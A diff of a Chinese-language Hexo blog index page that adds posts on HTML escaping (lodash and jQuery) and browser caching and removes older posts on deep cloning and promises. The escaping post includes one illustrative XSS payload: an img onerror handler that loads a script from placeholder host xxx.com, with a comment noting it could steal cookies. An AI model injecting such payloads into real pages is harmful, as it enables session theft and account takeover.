@@ -282,7 +282,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">28</span>
+              <span class="site-state-item-count">30</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -354,6 +354,288 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/08/20/questions-1/" itemprop="url">
+                  Question
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2019-08-20T16:55:11+08:00" content="2019-08-20">
+              2019-08-20
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Question/" itemprop="url" rel="index">
+                    <span itemprop="name">Question</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="开发常见问题"><a href="#开发常见问题" class="headerlink" title="开发常见问题"></a>开发常见问题</h1><hr>
+<h2 id="1-html转义问题"><a href="#1-html转义问题" class="headerlink" title="1. html转义问题"></a>1. html转义问题</h2><h3 id="dom-上的属性被-转义："><a href="#dom-上的属性被-转义：" class="headerlink" title="dom 上的属性被$()转义："></a>dom 上的属性被$()转义：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;&lt;div data-comment=&quot;&#123;&amp;quot;title&amp;quot;:&amp;quot;重难点&amp;quot;,&amp;quot;background&amp;quot;:&amp;quot;rgb(240, 149, 82)&amp;quot;,&amp;quot;icon_src&amp;quot;:&amp;quot;/system/images/171025215642____.png&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&amp;quot;&#125;&quot;&gt;&lt;/div&gt;&apos;)</span><br><span class="line"></span><br><span class="line">// 将div标签上的 data-comment 属性转义后的值如下：</span><br><span class="line">nodeValue: &quot;&#123;&quot;title&quot;:&quot;重难点&quot;,&quot;background&quot;:&quot;rgb(240, 149, 82)&quot;,&quot;icon_src&quot;:&quot;/system/images/171025215642____.png&quot;,&quot;content&quot;:&quot;11111&lt;br &gt;&lt;/div&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;&#125;&quot; </span><br><span class="line">// 明显多出来一个&lt;/div&gt;啊</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>解决办法</p>
+<ol>
+<li>lodash 的 escape 和 unescape(推荐)</li>
+</ol>
+<ul>
+<li>_.escape：转换字符串中的 <code>&quot;&amp;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &#39;&quot;&#39;, &quot;&#39;&quot;</code> 为HTML的响应实体字符，没有其他多余的字符被转义。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.escape(&apos;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&apos;)</span><br><span class="line">// &quot;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li><p>_.usescape：转换字符串中的实体字符 <code>&amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39;</code> 为响应的 HTML 字符。与escape中的字符一一对应。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.unescape(&apos;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&apos;)</span><br><span class="line">// &quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果不反转义直接放到dom中呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 浏览器会反转义一次字符串，结果展示到页面上：</span><br><span class="line">11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt; // 纯字符串</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当在浏览器控制台选中dom后，右键选择：”Edit as HTML”后，展示的输入框内容相当于进行了一次 escape，确定输入后又进行了一次 unescape, HTML 中的预留字符必须被替换为字符实体。</p>
+</li>
+</ul>
+<ol start="2">
+<li>利用 jquery<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// HTML标签转义（&lt; 转为 &amp;lt;）</span><br><span class="line">function html2Escape(sHtml) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).text(sHtml).html();</span><br><span class="line">&#125;</span><br><span class="line">// HTML标签反转义（&amp;lt; 转为 &lt;）</span><br><span class="line">function escape2Html(str) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).html(str).text();</span><br><span class="line">&#125;</span><br><span class="line">// 此方法在反转义的时候会将形如：1&lt;br &gt;&lt;/div&gt;2&lt;br /&gt;3&lt;br /&gt;的内容反转为123</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="除了被-转义外，其他情况有哪些呢？"><a href="#除了被-转义外，其他情况有哪些呢？" class="headerlink" title="除了被 $() 转义外，其他情况有哪些呢？"></a>除了被 $() 转义外，其他情况有哪些呢？</h3><ol>
+<li>XSS 攻击<br>在浏览器上随便选择一个 dom，控制台执行如下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$0.innerHTML=&quot;&lt;img src=@ onerror=alert(1)&gt;&quot; // alert(1)</span><br><span class="line"></span><br><span class="line">$0.innerHTML = &quot;&lt;img src=@ onerror=&apos;var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;https://xxx.com/xx.js\&quot;;document.body.appendChild(s);&apos; /&gt;&quot;</span><br><span class="line">// 代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口等</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/08/14/performance/" itemprop="url">
+                  Performance
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2019-08-14T21:17:09+08:00" content="2019-08-14">
+              2019-08-14
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Performance/" itemprop="url" rel="index">
+                    <span itemprop="name">Performance</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h1><hr>
+<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>良好的缓存策略可以降低资源的重复加载提高网页的整体加载速度，通常浏览器缓存策略分为两种：强缓存和协商缓存</p>
+<h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><blockquote>
+<p>在<em>响应头</em>中添加 <code>Expires: Thu, 28 Dec 2019 05:27:45 GMT</code> 或 <code>Cache-Control: public, max-age=2592000</code> 来控制强缓存。</p>
+<ul>
+<li>Expires 是 HTTP/1.0 的字段，它规定了缓存过期的一个绝对时间，过期后需再次请求。缺点：Expires 使用的是客户端本机时间不准确，所以引入了 Cache-Control:max-age。</li>
+<li>Cache-Control 是 HTTP/1.1 的字段，它规定了缓存过期的一个相对时间。优先级：Cache-Control &gt; Expires。常用指令如下：<br>public: 任意一方都能缓存该资源(客户端、代理服务器等)。<br>max-age(秒)：缓存的时长，也是响应的最大的Age值。<br>s-maxage(秒)：公共缓存服务器响应的最大Age值。</li>
+<li>强缓存阶段如果本地缓存没有过期则服务端返回200 (from disk cache)或是200 OK (from memory cache)</li>
+</ul>
+</blockquote>
+<h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><blockquote>
+<p>在<em>请求头</em>中添加 <code>If-Modified-Since: Tue, 28 Nov 2019 05:14:02 GMT</code> 或 <code>If-None-Match: W/&quot;5a1cf09a-63c6&quot;</code> 开启协商缓存。</p>
+<ul>
+<li>If-Modified-Since 中携带的信息为该资源上次请求的响应头中的 Last-Modified 字段。If-None-Match 中携带的信息为该资源上次请求的响应头中的 ETag 字段。服务器通过这两个字段来判断资源是否有修改，如果有修改则返回状态码200和新的内容，如果没有修改返回状态码304。</li>
+<li>Last-Modified 是 HTTP/1.0 的字段。在第一次请求改资源时把这个标识放到响应头传到客户端，标记此资源在服务器端最后被修改的时间。缺点：如果某个资源只是修改了，但实际内容并没有发生变化，Last-Modified 无法判断出来。</li>
+<li>ETag 是 HTTP/1.1 的字段。服务器通过某种算法对资源生成一个唯一的标识。在第一次请求该资源时把这个标识放到响应头传到客户端。优先级：ETag &gt; Last-Modified</li>
+</ul>
+</blockquote>
+<h3 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h3><ol>
+<li>请求被缓存，导致新代码未生效？</li>
+</ol>
+<ul>
+<li>服务端响应添加Cache-Control:no-cache,must-revalidate;指定不使用强缓存。</li>
+<li>修改请求头If-modified-since:0或If-none-match:””</li>
+<li>修改请求URL，请求URL后加随机数，随机数可以是时间戳，哈希值，比如：<a href="http://xxxx.com?a=123412323" target="_blank" rel="noopener">http://xxxx.com?a=123412323</a></li>
+<li>通过 webpack contentHash 每次文件内容改变了则改变文件名</li>
+</ul>
+<h2 id="chrome-devtools-调试"><a href="#chrome-devtools-调试" class="headerlink" title="chrome devtools 调试"></a>chrome devtools 调试</h2>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
     
       
 
@@ -1622,402 +1904,6 @@
 </ul>
 <h2 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h2><ul>
 <li>实现一个 promise<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">function myPromise(callback) &#123;</span><br><span class="line">  const self = this;</span><br><span class="line">  self.status = &quot;pending&quot;; // pending、resolved、rejected</span><br><span class="line">  self.value = undefined;</span><br><span class="line">  self.reason = undefined;</span><br><span class="line"></span><br><span class="line">  function resolve(value) &#123;</span><br><span class="line">    if (self.status === &quot;pending&quot;) &#123;</span><br><span class="line">      self.value = value;</span><br><span class="line">      self.status = &apos;resolved&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function reject(reason) &#123;</span><br><span class="line">    if (self.status === &quot;pending&quot;) &#123;</span><br><span class="line">      self.reason = reason;</span><br><span class="line">      self.status = &apos;rejected&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">    callback(resolve, reject)</span><br><span class="line">  &#125; catch(e) &#123;</span><br><span class="line">    reject(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myPromise.prototype.then = function(onResolved, onRejected) &#123;</span><br><span class="line">  const self = this;</span><br><span class="line">  switch(self.status)&#123;</span><br><span class="line">    case &quot;resolved&quot;:</span><br><span class="line">      onResolved(self.value);</span><br><span class="line">      break;</span><br><span class="line">    case &quot;rejected&quot;:</span><br><span class="line">      onRejected(self.reason);</span><br><span class="line">      break;</span><br><span class="line">    default:       </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 测试一下</span><br><span class="line">var p = new myPromise((r, j) =&gt; &#123;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">      r(66666)</span><br><span class="line">  &#125;, 3000)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.then((v) =&gt; &#123;</span><br><span class="line">  console.log(v) // 6666</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/24/javascript-clone/" itemprop="url">
-                  JavaScript-clone
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2018-05-24T11:02:18+08:00" content="2018-05-24">
-              2018-05-24
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/JavaScript/" itemprop="url" rel="index">
-                    <span itemprop="name">JavaScript</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">// lodash 中还添加了node中的数据类型，如ArrayBuffer等。</span><br><span class="line">const mapTag = &apos;[object Map]&apos;;</span><br><span class="line">const setTag = &apos;[object Set]&apos;;</span><br><span class="line">const arrayTag = &apos;[object Array]&apos;;</span><br><span class="line">const objectTag = &apos;[object Object]&apos;;</span><br><span class="line">const argsTag = &apos;[object Arguments]&apos;;</span><br><span class="line"></span><br><span class="line">const boolTag = &apos;[object Boolean]&apos;;</span><br><span class="line">const dateTag = &apos;[object Date]&apos;;</span><br><span class="line">const numberTag = &apos;[object Number]&apos;;</span><br><span class="line">const stringTag = &apos;[object String]&apos;;</span><br><span class="line">const symbolTag = &apos;[object Symbol]&apos;;</span><br><span class="line">const errorTag = &apos;[object Error]&apos;;</span><br><span class="line">const regexpTag = &apos;[object RegExp]&apos;;</span><br><span class="line">const funcTag = &apos;[object Function]&apos;;</span><br><span class="line"></span><br><span class="line">const deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 判断是否为对象（lodash）</span><br><span class="line"> * isObject(&#123;&#125;) // =&gt; true</span><br><span class="line"> * isObject([1, 2, 3]) // =&gt; true</span><br><span class="line"> * isObject(Function) // =&gt; true</span><br><span class="line"> * isObject(null) // =&gt; false</span><br><span class="line"> */</span><br><span class="line">function isObject(value) &#123;</span><br><span class="line">  const type = typeof value</span><br><span class="line">  return value != null &amp;&amp; (type === &apos;object&apos; || type === &apos;function&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 获取初始化对象</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> */</span><br><span class="line">function getInit(target) &#123;</span><br><span class="line">  const Ctor = target.constructor;</span><br><span class="line">  return new Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 获取值类型</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> */</span><br><span class="line">function getType(target) &#123;</span><br><span class="line">  return Object.prototype.toString.call(target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 非遍历类型克隆</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> * @param &#123;*&#125; type </span><br><span class="line"> */</span><br><span class="line">function cloneOtherType(target, type) &#123;</span><br><span class="line">  const Ctor = target.constructor;</span><br><span class="line">  switch (type) &#123;</span><br><span class="line">    case boolTag:</span><br><span class="line">    case numberTag:</span><br><span class="line">    case stringTag:</span><br><span class="line">    case errorTag:</span><br><span class="line">    case dateTag:</span><br><span class="line">      return new Ctor(+target); // 传入时间戳兼容性更好，同lodash</span><br><span class="line">    case regexpTag:</span><br><span class="line">      return cloneRegExp(target);</span><br><span class="line">    case symbolTag:</span><br><span class="line">      return cloneSymbol(target);</span><br><span class="line">    case funcTag:</span><br><span class="line">      // return cloneFunction(target);</span><br><span class="line">      return target; // 函数可以不做处理，返回自身</span><br><span class="line">    default:</span><br><span class="line">      return null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆正则表达式（lodash）</span><br><span class="line"> * @param &#123;*&#125; regexp </span><br><span class="line"> */</span><br><span class="line">function cloneRegExp(regexp) &#123;</span><br><span class="line">  const reFlags = /\w*$/;</span><br><span class="line">  const result = new regexp.constructor(regexp.source, reFlags.exec(regexp));</span><br><span class="line">  result.lastIndex = regexp.lastIndex;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆Symbol(lodash)</span><br><span class="line"> * @param &#123;*&#125; target </span><br><span class="line"> */</span><br><span class="line">function cloneSymbol(target) &#123;</span><br><span class="line">  return Object(Symbol.prototype.valueOf.call(target));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆函数(可不处里)</span><br><span class="line"> * @param &#123;*&#125; func </span><br><span class="line"> */</span><br><span class="line">function cloneFunction(func) &#123;</span><br><span class="line">  const bodyReg = /(?&lt;=&#123;)(.|\n)+(?=&#125;)/m;</span><br><span class="line">  const paramReg = /(?&lt;=\().+(?=\)\s+&#123;)/;</span><br><span class="line">  const funcString = func.toString();</span><br><span class="line">  if (func.prototype) &#123;</span><br><span class="line">    const param = paramReg.exec(funcString);</span><br><span class="line">    const body = bodyReg.exec(funcString);</span><br><span class="line">    if (body) &#123;</span><br><span class="line">      if (param) &#123;</span><br><span class="line">        const paramArr = param[0].split(&apos;,&apos;);</span><br><span class="line">        return new Function(...paramArr, body[0]);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return new Function(body[0]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return null;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return eval(funcString);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 遍历函数</span><br><span class="line"> * @param &#123;*&#125; array </span><br><span class="line"> * @param &#123;*&#125; iteratee </span><br><span class="line"> */</span><br><span class="line">function forEach(array, iteratee) &#123;</span><br><span class="line">  let index = -1;</span><br><span class="line">  const length = array.length;</span><br><span class="line">  while (++index &lt; length) &#123;</span><br><span class="line">    iteratee(array[index], index);</span><br><span class="line">  &#125;</span><br><span class="line">  return array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 克隆主函数</span><br><span class="line"> * @param &#123;*&#125; target 被克隆对象</span><br><span class="line"> * @param &#123;*&#125; map 处理循环引用, lodash用构建了一个栈来存储键值对，后续解析</span><br><span class="line"> */</span><br><span class="line">function clone(target, map = new WeakMap()) &#123;</span><br><span class="line">  // 克隆原始类型</span><br><span class="line">  if (!isObject(target)) return target;</span><br><span class="line"></span><br><span class="line">  // 初始化</span><br><span class="line">  const type = getType(target);</span><br><span class="line"></span><br><span class="line">  // 处理形如 new Number(1) 的原始值</span><br><span class="line">  if (!deepTag.includes(type)) return cloneOtherType(target, type);</span><br><span class="line"></span><br><span class="line">  // 原始类型</span><br><span class="line">  if (deepTag.includes(type)) &#123; // 引用类型</span><br><span class="line">    const cloneTarget = getInit(target, type);</span><br><span class="line">    const mapTarget = map.get(target);</span><br><span class="line"></span><br><span class="line">    // 防止循环引用</span><br><span class="line">    if (mapTarget) return mapTarget;</span><br><span class="line">    map.set(target, cloneTarget);</span><br><span class="line"></span><br><span class="line">    // 克隆set</span><br><span class="line">    if (type === setTag) &#123;</span><br><span class="line">      target.forEach(value =&gt; &#123;</span><br><span class="line">        cloneTarget.add(clone(value, map));</span><br><span class="line">      &#125;);</span><br><span class="line">      return cloneTarget;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 克隆map</span><br><span class="line">    if (type === mapTag) &#123;</span><br><span class="line">      target.forEach((value, key) =&gt; &#123;</span><br><span class="line">        cloneTarget.set(key, clone(value, map));</span><br><span class="line">      &#125;);</span><br><span class="line">      return cloneTarget;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 克隆对象和数组</span><br><span class="line">    const keys = type === arrayTag ? undefined : Object.keys(target);</span><br><span class="line">    forEach(keys || target, (value, key) =&gt; &#123;</span><br><span class="line">      if (keys) &#123;</span><br><span class="line">        // 对象结构键不使用索引</span><br><span class="line">        key = value;</span><br><span class="line">      &#125;</span><br><span class="line">      cloneTarget[key] = clone(target[key], map);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return cloneTarget;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default clone;</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/24/javascript-asyncAwait/" itemprop="url">
-                  JavaScript-async/await
